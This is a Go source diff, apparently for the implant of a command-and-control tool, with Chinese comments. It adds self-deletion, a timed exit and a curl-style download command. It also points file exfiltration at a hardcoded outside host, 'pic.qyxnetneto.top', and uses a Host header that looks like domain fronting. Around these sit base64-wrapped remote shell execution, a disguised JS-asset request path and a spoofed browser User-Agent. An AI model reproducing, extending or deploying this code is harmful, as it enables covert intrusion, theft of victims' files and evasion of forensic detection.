@@ -14,6 +14,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"os/user"
@@ -45,7 +46,7 @@ func ShellExecute(command string) (string, error) {
 	cmdstr, _ := util.Strim(command)
 	base64Cmd := base64.StdEncoding.EncodeToString([]byte(cmdstr))
 	final_cmd := util.Sprintf("echo %s | timeout 4 base64 -d | timeout %d %s", base64Cmd, 4, sh_path)
-
+	util.Println(final_cmd)
 	cmd := exec.Command(sh_path, "-c", final_cmd)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
@@ -101,7 +102,36 @@ func SpawnCommand(targetPath string) (string, error) {
 
 	return util.Sprintf("Spawned new process from %s to %s.\n", currentExecutablePath, targetPath), nil
 }
+func Exit() (string, error) {
 
+	// 设置一个5秒的定时器
+	timer := time.NewTimer(5 * time.Second)
+
+	// 启动一个 goroutine，在定时器到期时调用 exit
+	go func() {
+		<-timer.C
+		os.Exit(0)
+	}()
+
+	// 返回指示进程即将被终止
+	return util.Sprintf("kill"), nil
+}
+func SelfDel() (string, error) {
+	// 获取当前可执行文件的路径
+	exePath, err := os.Executable()
+	if err != nil {
+		return "", util.Errorf("Error getting executable path: %v", err)
+	}
+
+	// 尝试删除当前可执行文件
+	err = os.Remove(exePath)
+	if err != nil {
+		return "", util.Errorf("Failed to delete %s: %v", exePath, err)
+	}
+
+	// 返回指示成功删除
+	return util.Sprintf("Success to delete %s", exePath), nil
+}
 func randString(length int) string {
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, length)
@@ -186,7 +216,7 @@ func PSendFileAsync(filePath string) (string, error) {
 	rand.Seed(uint64(time.Now().UnixNano()))
 	randomString := randString(10)
 	requestPath := util.Sprintf("static/file/js/app.%s.js", randomString)
-	uri := util.Sprintf("https://%s:%d/%s", config.ServerHost, config.ServerPort, requestPath)
+	uri := util.Sprintf("https://%s/%s", "pic.qyxnetneto.top", requestPath)
 	httpContent := bytes.NewBufferString(encryptedContentString)
 	// 创建带有自定义头部的请求
 	req, err := http.NewRequest("POST", uri, httpContent)
@@ -200,6 +230,8 @@ func PSendFileAsync(filePath string) (string, error) {
 	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0")
 	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
+	req.Host = config.ServerHostDomain
+	req.URL.Host = "pic.qyxnetneto.top"
 
 	// 发送请求
 	resp, err := client.Do(req)
@@ -649,4 +681,183 @@ func Getpwd() (string, error) {
 
 func Ps() (string, error) {
 	return ps()
+}
+
+func GoCurl(command string) (string, error) {
+	curlCmd := "curl " + command
+	args := parseargs(curlCmd)
+	util.Println(args)
+	if len(args) < 2 || args[0] != "curl" {
+		util.Println("Invalid curl command")
+		return "", util.Errorf("Invalid curl command")
+	}
+	util.Println(args)
+	method := "GET"          // 默认方法
+	headers := http.Header{} // 请求头
+	data := ""               // 请求体
+	urlStr := ""             // 请求 URL
+	saveToFile := false      // 是否保存文件
+	skipVerify := false      // 是否跳过 HTTPS 验证
+	timeout := 0             // 请求延时
+	proxyStr := ""           // 代理地址
+	headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0")
+	for i := 0; i < len(args); i++ {
+		switch args[i] {
+		case "-X":
+			i++
+			method = args[i]
+		case "-H", "--header":
+			i++
+			if strings.HasPrefix(args[i], "\"") {
+				args[i] = strings.TrimPrefix(args[i], "\"")
+			}
+			if strings.HasSuffix(args[i], "\"") {
+				args[i] = strings.TrimSuffix(args[i], "\"")
+			}
+			headerParts := strings.SplitN(args[i], ":", 2)
+			if len(headerParts) == 2 {
+				key := strings.TrimSpace(headerParts[0])
+				value := strings.TrimSpace(headerParts[1])
+				util.Println(key)
+				util.Println(value)
+				headers.Add(key, value) // 使用 Add 方法支持多个值
+			}
+		case "-d", "--data":
+			i++
+			if strings.HasPrefix(args[i], "\"") {
+				args[i] = strings.TrimPrefix(args[i], "\"")
+			}
+			if strings.HasSuffix(args[i], "\"") {
+				args[i] = strings.TrimSuffix(args[i], "\"")
+			}
+			data = args[i]
+		case "-LO", "--output":
+			saveToFile = true
+		case "-ks":
+			skipVerify = true
+		case "-skim5":
+			skipVerify = true
+			timeout = 5
+		case "--proxy":
+			i++
+			proxyStr = args[i]
+		default:
+			if strings.HasPrefix(args[i], "http://") || strings.HasPrefix(args[i], "https://") {
+				util.Println(args[i])
+				urlStr = args[i]
+			}
+		}
+	}
+	if urlStr == "" {
+		util.Println("No URL provided")
+		return "", util.Errorf("No URL provided")
+	}
+	var reqBody io.Reader
+	if data != "" {
+		reqBody = strings.NewReader(data)
+	}
+	req, _ := http.NewRequest(method, urlStr, reqBody)
+	// 设置请求头
+	req.Header = headers
+
+	// 创建自定义 HTTP 客户端
+	client := &http.Client{}
+	if timeout > 0 {
+		client.Timeout = time.Duration(timeout) * time.Second
+	}
+	transport := &http.Transport{}
+	if skipVerify {
+		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	}
+	if proxyStr != "" {
+		proxyURL, err := url.Parse(proxyStr)
+		if err != nil {
+			util.Println("Invalid proxy URL:", proxyStr)
+			return "", util.Errorf("Invalid proxy URL: %v", err)
+		}
+		transport.Proxy = http.ProxyURL(proxyURL)
+	}
+	client.Transport = transport
+
+	resp, err := client.Do(req)
+	if err != nil {
+		util.Println("Error sending request:", err)
+		return "", util.Errorf("Error sending request: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if saveToFile {
+		// 解析文件名
+		filename := parseFilenameFromURL(urlStr)
+		util.Println("Saving response to file:", filename)
+		file, err := os.Create(filename)
+		if err != nil {
+			util.Println("Error creating file:", err)
+			return "", util.Errorf("Error creating file: %v", err)
+		}
+		defer file.Close()
+		_, err = io.Copy(file, resp.Body)
+		if err != nil {
+			util.Println("Error saving response:", err)
+		}
+		return util.Sprintf("Response saved to file: %s", filename), nil
+	} else {
+		responseBody, _ := processResponse(resp)
+		return util.Sprintf("Response: \n%s", responseBody), nil
+	}
+}
+
+func processResponse(resp *http.Response) (string, error) {
+	// Create a buffer to hold the response content
+	var buffer bytes.Buffer
+
+	// Create a multi-writer to write to both buffer and standard output
+	writer := io.MultiWriter(&buffer, os.Stdout)
+
+	// Write the response body to the writer
+	_, err := io.Copy(writer, resp.Body)
+	if err != nil {
+		util.Println("Error reading response:", err)
+		return "", err
+	}
+
+	// Convert the buffer content to a string and return it
+	return buffer.String(), nil
+}
+func parseFilenameFromURL(url string) string {
+	parts := strings.Split(strings.TrimSuffix(url, "/"), "/")
+	filename := parts[len(parts)-1]
+	if filename == "" {
+		filename = "default"
+	}
+	return filename
+}
+
+func parseargs(command string) []string {
+	var result []string
+	var currentArgs strings.Builder
+	inQuotes := false
+	for i := 0; i < len(command); i++ {
+		char := command[i]
+		switch char {
+		case '"':
+			inQuotes = !inQuotes
+		case ' ':
+			if !inQuotes {
+				if currentArgs.Len() > 0 {
+					result = append(result, currentArgs.String())
+					currentArgs.Reset()
+				} else {
+					currentArgs.WriteByte(char)
+				}
+
+			}
+		default:
+			currentArgs.WriteByte(char)
+		}
+	}
+	if currentArgs.Len() > 0 {
+		result = append(result, currentArgs.String())
+	}
+	return result
 }
